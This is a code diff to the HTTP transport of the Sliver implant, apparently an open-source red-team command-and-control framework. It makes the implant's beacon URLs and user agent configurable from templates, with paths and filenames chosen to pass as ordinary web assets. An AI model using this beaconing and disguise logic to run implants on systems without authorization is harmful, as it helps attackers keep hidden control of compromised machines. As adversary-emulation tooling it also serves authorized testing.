@@ -23,7 +23,7 @@ package transports
 // Procedural C2
 // ===============
 // .txt = rsakey
-// .jsp = init
+// .png = init
 // .php = session
 //  .js = poll
 
@@ -57,7 +57,7 @@ import (
 )
 
 const (
-	defaultUserAgent  = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+	defaultUserAgent  = "{{GenerateUserAgent}}"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
@@ -191,7 +191,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	// {{end}}
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
-	uri := s.jspURL()
+	uri := s.pngURL()
 	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -301,32 +301,68 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 
 func (s *SliverHTTPClient) jsURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"js", "static", "assets", "dist", "javascript"}
-	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
+
+	segments := []string{
+		// {{range .HTTPC2Config.JsPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2Config.JsFiles}}
+		"{{.}}",
+		// {{end}}
+	}
+
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
-func (s *SliverHTTPClient) jspURL() string {
+func (s *SliverHTTPClient) pngURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"app", "admin", "upload", "actions", "api"}
-	filenames := []string{"login.jsp", "admin.jsp", "session.jsp", "action.jsp"}
+
+	segments := []string{
+		// {{range .HTTPC2Config.PngPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2Config.PngFiles}}
+		"{{.}}",
+		// {{end}}
+	}
+
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
 func (s *SliverHTTPClient) phpURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"api", "rest", "drupal", "wordpress"}
-	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
+	segments := []string{
+		// {{range .HTTPC2Config.PhpPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2Config.PhpFiles}}
+		"{{.}}",
+		// {{end}}
+	}
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
 func (s *SliverHTTPClient) txtURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"static", "www", "assets", "text", "docs", "sample"}
-	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
+	segments := []string{
+		// {{range .HTTPC2Config.TxtPaths}}
+		"{{.}}",
+		// {{end}}
+	}
+	filenames := []string{
+		// {{range .HTTPC2Config.TxtFiles}}
+		"{{.}}",
+		// {{end}}
+	}
 	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
